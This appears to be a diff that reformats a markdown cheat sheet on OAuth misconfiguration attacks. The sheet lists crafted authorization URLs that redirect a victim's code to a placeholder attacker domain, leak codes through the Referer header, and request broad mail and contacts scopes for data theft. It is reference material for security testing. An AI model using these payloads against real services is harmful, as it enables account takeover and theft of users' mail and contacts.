@@ -1,6 +1,7 @@
 # OAuth Misconfiguration
 
 ## Table of Contents
+
 - [Account Takeover](#account-takeover)
 - [Data Exfiltration](#data-exfiltration)
 
@@ -9,13 +10,13 @@
 ### The identity the service trusts can be redirected, forged, or attached to someone else's account, giving the attacker the victim's account rather than their own.
 
 - Redirecting the authorization code to the attacker [^1]
-    ```
+    ```text
     https://[IDENTITY-PROVIDER]/oauth/authorize?client_id=[VULNERABLE-SERVICE-CLIENT-ID]&redirect_uri=https://[ATTACKER-DOMAIN]/callback&response_type=code&scope=openid%20email
     ```
     A victim who is already signed in to the identity provider is redirected to the attacker with a code issued for the vulnerable service. The attacker exchanges it and holds the victim's session.
 
 - Leaking the authorization code through the `Referer` header
-    ```
+    ```text
     https://[VULNERABLE-SERVICE]/callback?code=[AUTHORIZATION-CODE]&state=[STATE]
     ```
     Any third-party resource loaded by the landing page receives this full URL, including the code, in its `Referer` header.
@@ -38,7 +39,7 @@
 ### A code stolen from the service's own client can be exchanged for a token carrying every scope that client holds, not only the ones the service actually uses.
 
 - Exchanging a stolen code for a broadly scoped token
-    ```
+    ```text
     https://[IDENTITY-PROVIDER]/oauth/authorize?client_id=[VULNERABLE-SERVICE-CLIENT-ID]&redirect_uri=https://[ATTACKER-DOMAIN]/callback&response_type=code&scope=openid%20email%20contacts.read%20mail.read
     ```
     The victim's data at the identity provider — contacts, mail, stored files — becomes reachable to the attacker, so the damage is not confined to the vulnerable service.
